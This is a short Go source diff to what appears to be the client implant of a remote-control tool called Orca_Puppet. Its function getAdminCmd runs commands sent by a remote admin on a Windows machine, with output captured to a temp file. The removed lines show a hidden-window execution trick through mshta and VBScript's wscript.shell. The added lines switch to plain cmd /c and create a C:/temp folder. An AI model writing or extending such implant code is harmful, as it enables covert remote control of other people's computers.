@@ -1,6 +1,7 @@
 package controller
 
 import (
+	"Orca_Puppet/cli/cmdopt/fileopt"
 	"Orca_Puppet/cli/common"
 	"Orca_Puppet/define/colorcode"
 	"Orca_Puppet/define/config"
@@ -29,7 +30,10 @@ func getAdminCmd(sendUserId, decData string) {
 	echo := adminMsg.Echo
 	delay := adminMsg.Delay
 	timeStr := strconv.FormatInt(time.Now().Unix(), 10)
-	tempFile := fmt.Sprintf("C:\\Windows\\temp\\%s.txt", timeStr)
+	tempFile := fmt.Sprintf("C:/temp/%s.txt", timeStr)
+	if !fileopt.IsDir("C:/temp") {
+		os.Mkdir("C:/temp", 0666)
+	}
 	if len(strings.TrimSpace(cmd)) == 0 {
 		path, err := util.GetExecPath()
 		if err != nil {
@@ -44,9 +48,9 @@ func getAdminCmd(sendUserId, decData string) {
 		cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s %s\",0)(window.close) &&exit", path, args)
 	} else {
 		if echo {
-			cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s > %s\",0)(window.close) &&exit", cmd, tempFile)
+			cmd = fmt.Sprintf("cmd /c %s > %s && exit", cmd, tempFile)
 		} else {
-			cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s\",0)(window.close) &&exit", cmd)
+			cmd = fmt.Sprintf("cmd /c %s && exit", cmd)
 		}
 	}
 
